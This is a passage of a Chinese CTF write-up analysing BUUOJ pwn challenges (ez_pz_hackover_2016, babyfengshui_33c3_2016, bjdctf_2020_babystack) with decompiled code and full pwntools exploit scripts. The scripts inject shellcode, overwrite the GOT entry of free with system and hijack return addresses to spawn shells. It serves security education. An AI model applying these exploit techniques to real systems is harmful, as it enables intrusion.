class="comment">// [esp+40Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Yippie, lets crash: %p\n"</span>, &amp;s);   <span class="comment">//这里可以得到栈地址</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Whats your name?\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">0x3FF</span>, <span class="built_in">stdin</span>);                 <span class="comment">//向s 处 最多可输入0x3ff字节数据</span></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(&amp;s);</span><br><span class="line">  v3 = <span class="built_in">memchr</span>(&amp;s, <span class="string">'\n'</span>, v0);             <span class="comment">//判断程序时候有 "\n"</span></span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    *v3 = <span class="number">0</span>;                               <span class="comment">//有的话 令它 等于 "\0"</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nWelcome %s!\n"</span>, &amp;s);         </span><br><span class="line">  result = (<span class="keyword">void</span> *)<span class="built_in">strcmp</span>(&amp;s, <span class="string">"crashme"</span>);  <span class="comment">//这里再将 s处的字符串与"crashme"作比较</span></span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    result = vuln((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;s, <span class="number">0x400</span>u);<span class="comment">//如果相等，进入vuln()函数</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">******************************************************************</span><br><span class="line"><span class="keyword">void</span> *__<span class="function">cdecl <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> src, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [esp+6h] [ebp-32h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(&amp;dest, &amp;src, n);   <span class="comment">//将 以s位置开始0x400的数据都将会拷贝到dest位置</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以经过我们的上面的分析(代码中的注释)，写出以下exp：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line"></span><br><span class="line">p = process('./ez_pz_hackover_2016')</span><br><span class="line"><span class="comment">#p = remote('node3.buuoj.cn', 29638)</span></span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="section">p.recvuntil('crash: ')</span></span><br><span class="line">stack_addr = int(p.recv(10), 16)     </span><br><span class="line">p.recvuntil('&gt; ')</span><br><span class="line">pd = 'crashme\x00'               <span class="comment">#绕过 strcmp  进入 memcpy</span></span><br><span class="line">pd = pd.ljust(26, '\x00')        <span class="comment">#覆盖 掉 ebp</span></span><br><span class="line">pd += p32(stack_addr-0x1C)<span class="comment">#(0xffdab72c-0xffdab710) 将返回地址 覆盖为 shellcraft所在的栈地址 </span></span><br><span class="line">pd += asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">p.sendline(pd)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>可以成功拿到shell！</p><h2 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h2><p>这题 是个很好的 堆入门题。我们一起来分析下吧。</p><p>首先，我们 来检查下保护：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">file</span> <span class="string">babyfengshui_33c3_2016</span> </span><br><span class="line"><span class="attr">babyfengshui_33c3_2016:</span> <span class="string">ELF</span> <span class="number">32</span><span class="string">-bit</span> <span class="string">LSB</span> <span class="string">executable,</span> <span class="string">Intel</span> <span class="number">80386</span><span class="string">,</span> <span class="string">version</span> <span class="number">1</span> <span class="string">(SYSV),</span> <span class="string">dynamically</span> <span class="string">linked,</span> </span><br><span class="line"><span class="string">interpreter</span> <span class="string">/lib/ld-,</span> <span class="string">for</span> <span class="string">GNU/Linux</span> <span class="number">2.6</span><span class="number">.32</span><span class="string">,</span> <span class="string">BuildID[sha1]=cecdaee24200fe5bbd3d34b30404961ca49067c6,</span> <span class="string">stripped</span></span><br><span class="line"></span><br><span class="line"><span class="string">$</span> <span class="string">checksec</span> <span class="string">babyfengshui_33c3_2016</span> </span><br><span class="line"><span class="string">[*]</span> </span><br><span class="line">    <span class="attr">Arch:</span>     <span class="string">i386-32-little</span></span><br><span class="line">    <span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span>          <span class="string">//</span> <span class="string">这里不是</span> <span class="string">FULL</span> <span class="string">RELRO</span>  <span class="string">，所以考虑</span> <span class="string">通过</span> <span class="string">改某函数的</span> <span class="string">got_addr</span> <span class="string">为</span> <span class="string">system，进而</span> <span class="string">拿到shell</span></span><br><span class="line">    <span class="attr">Stack:</span>    <span class="string">Canary</span> <span class="string">found</span></span><br><span class="line">    <span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line">    <span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x8048000)</span></span><br></pre></td></tr></table></figure><p>首先看下 main函数：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl __noreturn main()</span><br><span class="line">&#123;</span><br><span class="line">  char v0; <span class="regexp">//</span> [esp+<span class="number">3</span>h] [ebp-<span class="number">15</span>h]</span><br><span class="line">  int v1; <span class="regexp">//</span> [esp+<span class="number">4</span>h] [ebp-<span class="number">14</span>h]</span><br><span class="line">  size_t v2; <span class="regexp">//</span> [esp+<span class="number">8</span>h] [ebp-<span class="number">10</span>h]</span><br><span class="line">  unsigned int v3; <span class="regexp">//</span> [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0</span>x14u);</span><br><span class="line">  setvbuf(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  alarm(<span class="number">0</span>x14u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(<span class="string">"0: Add a user"</span>);</span><br><span class="line">    puts(<span class="string">"1: Delete a user"</span>);</span><br><span class="line">    puts(<span class="string">"2: Display a user"</span>);</span><br><span class="line">    puts(<span class="string">"3: Update a user description"</span>);</span><br><span class="line">    puts(<span class="string">"4: Exit"</span>);</span><br><span class="line">    printf(<span class="string">"Action: "</span>);</span><br><span class="line">    <span class="keyword">if</span> ( __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1) == -<span class="number">1</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v1 )</span><br><span class="line">    &#123;</span><br><span class="line">      printf(<span class="string">"size of description: "</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%u%c"</span>, &amp;v2, &amp;v0);</span><br><span class="line">      add_8048816(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">1</span> )                              <span class="regexp">//</span> <span class="keyword">delete</span></span><br><span class="line">    &#123;</span><br><span class="line">      printf(<span class="string">"index: "</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">      delete_8048905(v2);                       <span class="regexp">//</span> 没有 UAF</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">2</span> )                              <span class="regexp">//</span> show</span><br><span class="line">    &#123;</span><br><span class="line">      printf(<span class="string">"index: "</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">      show_804898F(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">3</span> )                              <span class="regexp">//</span> update</span><br><span class="line">    &#123;</span><br><span class="line">      printf(<span class="string">"index: "</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">      update_8048724(v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">"Bye"</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (unsigned __int8)i_804B069 &gt; <span class="number">0</span>x31u )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">"maximum capacity exceeded, bye"</span>);</span><br><span class="line">      <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后 我们看 各个函数，因为 有前两篇文章的 感觉，关于ida 上的 伪代码我尽量还是用 图片吧，看的会更清晰些。<br>在这之前 我们首先根据程序运行 封装下函数 我将封装的函数 先放上来，有助于理解：<br>。</p><figure class="highlight flix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span></span>(size,name,length,text):</span><br><span class="line">p.sendlineafter(<span class="string">"Action: "</span>,<span class="string">"0"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"size of description: "</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">"name: "</span>,name)</span><br><span class="line">p.sendlineafter(<span class="string">"text length: "</span>,str(length))</span><br><span class="line">p.sendlineafter(<span class="string">"text: "</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span></span>(<span class="keyword">index</span>, length, desc):</span><br><span class="line">p.sendlineafter(<span class="string">"Action: "</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"index: "</span>,str(<span class="keyword">index</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"text length: "</span>,str(length))</span><br><span class="line">p.sendlineafter(<span class="string">"text: "</span>,desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span></span>(<span class="keyword">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">"Action: "</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"index: "</span>,str(<span class="keyword">index</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span></span>(<span class="keyword">index</span>):</span><br><span class="line">p.sendlineafter(<span class="string">"Action: "</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"index: "</span>,str(<span class="keyword">index</span>))</span><br></pre></td></tr></table></figure><p>add_8048816函数：<br><br><img src="https://s1.ax1x.com/2020/04/15/J9Z7ND.png" alt="J9Z7ND.png"><br><br>在add函数中  我们 可以 知道这个程序 用的结构体 应该是 这个样子：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span>&#123;</span>                 <span class="comment">//v2=malloc(0x80)   v2 就是 结构体指针</span></span><br><span class="line"><span class="keyword">char</span> *desc;              <span class="comment">//*v2=decs_mem_addr  而 decs_mem_addr=malloc(desc_size) </span></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">7</span>c];           <span class="comment">//sub_80486BB((char *)ptr[(unsigned __int8)i_804B069] + 4, 0x7C);</span></span><br><span class="line">&#125;user;</span><br></pre></td></tr></table></figure><p>我们可以请容易看出  ptr （0x0804B080）相当于 是 保存结构体指针的数组。<br>delete_8048905<br><br><img src="https://s1.ax1x.com/2020/04/15/J9Z4nx.png" alt="J9Z4nx.png"><br><br>show_804898F<br><br><img src="https://s1.ax1x.com/2020/04/15/J9Z5B6.png" alt="J9Z5B6.png"><br><br>update_8048724<br><br><img src="https://s1.ax1x.com/2020/04/15/J9Zfj1.png" alt="J9Zfj1.png"><br><br>我们重点 分析下 这个 update_8048724 函数 就好了。</p><p>看第 13 行，程序  是 通过     (new_desc_size + ptr[i]-&gt;desc  &lt; (&amp;ptr[i] - 4 ) 检测才可以  继续 update 操作的。<br>正常来看的话，因为 malloc(struct user) 堆块 晚于 malloc(struct user-&gt;desc)堆块，且堆块相邻，所以，这个检测 的 本意是在update 每个user结构体中 desc 时，控制了new_desc_size 在于 这两个 堆块之间的距离再<br>-4 的 大小，这样的话，就不存在 堆溢出问题。</p><p>但这里我们可根据 堆分配的 理解，我们 可通过 一些操作去使得   malloc(struct user) 堆块 返回的地址与 malloc(struct user-&gt;desc)堆块返回的地址 之间的距离 变的很大。这样 我们就可以拥有 比较大的最多可输入 字节 数据，从而 使得程序 有堆溢出漏洞。 </p><p>而要如何操作呢，我们 可首先 add 两个 结构体 user0，user1，用于  刚刚说的” 一些操作”,</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">"aaa"</span>,<span class="number">0x80</span>,<span class="string">"aaa"</span>)#<span class="number">0</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">"bbb"</span>,<span class="number">0x80</span>,<span class="string">"bbb"</span>)#<span class="number">1</span></span><br><span class="line">#gdb.<span class="section">attach</span>(p)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">"ccc"</span>,<span class="number">0x20</span>,<span class="string">"/bin/sh\x00"</span>)#<span class="number">2</span>              # user2 用于 后面的 的操作，待会说</span><br><span class="line">#gdb.<span class="section">attach</span>(p)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">gdb.<span class="section">attach</span>(p)</span><br></pre></td></tr></table></figure><p>我们 将user0 给 free 掉，<br><br><img src="https://s1.ax1x.com/2020/04/15/J9ZIHK.png" alt="J9ZIHK.png"><br><br>此时 的bins 上  是 有个 272  即 hex(273)  即0x111 即 0x88+0x88+1的unsidned chunk，<br>而如果我们申请 把这个0x111的size chunk 给申请出来 且 全当做 新的 user0-&gt;desc的堆块，那么这个堆块返回的地址 就会是 0x9f92000+8 ，而接着 在add 函数中又会申请 0x80的chunk 当作 新的user 的chunk，这个 就会是从 top chunk 申请出 的 chunk 了，两者地址间的 距离相隔 就很大了，没有具体算了，肯定 大于  0x198,而  新的 user0-&gt;desc的堆块，那么这个堆块的返回的地址( 0x9f92000+8) 再加0x198的位置就是 user1结构体中的 desc指针了，因为此时已经存在栈溢出了 ，我们 把这个 指针给溢出覆盖成  free_got地址，然后可以通过show 函数来输出 free_got函数，进而leak出 libc，进而得到system 函数地址。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">add</span><span class="params">(<span class="number">0</span>x100,<span class="string">"ddd"</span>,<span class="number">0</span>x19c,<span class="string">"d"</span>*<span class="number">0</span>x198+p32(elf.got[<span class="string">'free'</span>])</span></span>)#<span class="number">0</span></span><br><span class="line"><span class="selector-id">#gdb</span>.attach(p)</span><br><span class="line"><span class="function"><span class="title">show</span><span class="params">(<span class="number">1</span>)</span></span></span><br></pre></td></tr></table></figure><p>接着 我们 再通过 update 函数 再将 user1 中的desc(此时对应的指针是 free_got了)，中的内容给改成 system，所以 只要我们执行 free(“/bin/sh\x00”)，就意味着 执行 system(“/bin/sh\x00”)了，从而pwn掉程序！<br>而再最开始  我们在  add user2 结构体时就已经提前 写入了 “/bin/sh\x00”了，所以 最后我们再 delete(2-1)即  delete(1)就可以拿到 shell了</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">update</span><span class="params">(<span class="number">1</span>,<span class="number">0</span>x4, p32(system_addr)</span></span>)</span><br><span class="line"><span class="function"><span class="title">delete</span><span class="params">(<span class="number">2</span>)</span></span></span><br></pre></td></tr></table></figure><p>完整 exp如下：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line"><span class="built_in">from</span> LibcSearcher import *</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">p = <span class="built_in">process</span>(<span class="string">'./babyfengshui_33c3_2016'</span>)</span><br><span class="line"><span class="comment">#p = remote("node3.buuoj.cn",29957)</span></span><br><span class="line">elf = ELF(<span class="string">'./babyfengshui_33c3_2016'</span>)</span><br><span class="line"><span class="comment">#libc=ELF("/lib/i386-linux-gnu/libc.so.6")#local</span></span><br><span class="line"></span><br><span class="line">def <span class="built_in">add</span>(size,name,<span class="built_in">length</span>,<span class="keyword">text</span>):</span><br><span class="line">p.sendlineafter(<span class="string">"Action: "</span>,<span class="string">"0"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"size of description: "</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">"name: "</span>,name)</span><br><span class="line">p.sendlineafter(<span class="string">"text length: "</span>,str(<span class="built_in">length</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"text: "</span>,<span class="keyword">text</span>)</span><br><span class="line"></span><br><span class="line">def update(index, <span class="built_in">length</span>, desc):</span><br><span class="line">p.sendlineafter(<span class="string">"Action: "</span>,<span class="string">"3"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"index: "</span>,str(index))</span><br><span class="line">p.sendlineafter(<span class="string">"text length: "</span>,str(<span class="built_in">length</span>))</span><br><span class="line">p.sendlineafter(<span class="string">"text: "</span>,desc)</span><br><span class="line"></span><br><span class="line">def <span class="built_in">delete</span>(index):</span><br><span class="line">p.sendlineafter(<span class="string">"Action: "</span>,<span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"index: "</span>,str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">p.sendlineafter(<span class="string">"Action: "</span>,<span class="string">"2"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"index: "</span>,str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">add</span>(<span class="number">0x80</span>,<span class="string">"aaa"</span>,<span class="number">0x80</span>,<span class="string">"aaa"</span>)<span class="comment">#0</span></span><br><span class="line"><span class="built_in">add</span>(<span class="number">0x80</span>,<span class="string">"bbb"</span>,<span class="number">0x80</span>,<span class="string">"bbb"</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="built_in">add</span>(<span class="number">0x20</span>,<span class="string">"ccc"</span>,<span class="number">0x20</span>,<span class="string">"/bin/sh\x00"</span>)<span class="comment">#2</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="built_in">delete</span>(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="built_in">add</span>(<span class="number">0x100</span>,<span class="string">"ddd"</span>,<span class="number">0x19c</span>,<span class="string">"d"</span>*<span class="number">0x198</span>+p32(elf.got[<span class="string">'free'</span>]))<span class="comment">#0</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"description: "</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u32(p.recvn(<span class="number">4</span>))</span><br><span class="line">libc=LibcSearcher(<span class="string">"free"</span>,free_addr)</span><br><span class="line">libc_base=free_addr-libc.dump(<span class="string">"free"</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">"system"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#system_addr = free_addr - (libc.symbols['free'] - libc.symbols['system'])</span></span><br><span class="line">print <span class="string">"system : "</span>+hex(system_addr)</span><br><span class="line"></span><br><span class="line">update(<span class="number">1</span>,<span class="number">0x4</span>, p32(system_addr))</span><br><span class="line"><span class="built_in">delete</span>(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="bjdctf-2020-babystack"><a href="#bjdctf-2020-babystack" class="headerlink" title="bjdctf_2020_babystack"></a>bjdctf_2020_babystack</h2><p>环境：ubuntu 16.04<br>经过前面两篇文章的讲解，这个实在属于最简单的 栈溢出题了。<br>简单说下 了。<br>ida：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"**********************************"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*     Welcome to the BJDCTF!     *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"* And Welcome to the bin world!  *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"*  Let's try to pwn the world!   *"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"* Please told me u answer loudly!*"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[+]Are u ready?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[+]Please input the length of your name:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;nbytes);                <span class="comment">// 输入 接下来 要输入的 长 度</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[+]What's u name?"</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)nbytes);          <span class="comment">// 输入 最长 为 nbytes 的内容</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">***********************************************</span><br><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  system(<span class="string">"/bin/sh"</span>);                            <span class="comment">// 0x4006E6</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栈溢出 ，然后还有 后门函数，直接写脚本了。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(<span class="string">"./bjdctf_2020_babystack"</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27670</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Please input the length of your name:<span class="subst">\n</span>"</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x30</span>))</span><br><span class="line">#gdb.<span class="section">attach</span>(p)</span><br><span class="line">p.recvuntil(<span class="string">"What's u name?<span class="subst">\n</span>"</span>)</span><br><span class="line">p.sendline(<span class="string">"a"</span>*<span class="number">0x10</span>+p64(<span class="number">0xdeadbeef</span>)+p64(<span class="number">0x4006E6</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h2><p><img src="https://s1.ax1x.com/2020/04/15/J9ZTAO.png" alt="J9ZTAO.png"><br><br>这道题 考察栈迁移的，刚好再次把它给熟悉下。我们 还像 往常一样首先 检查下 程序开启保护：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">file</span> <span class="string">spwn</span> </span><br><span class="line"><span 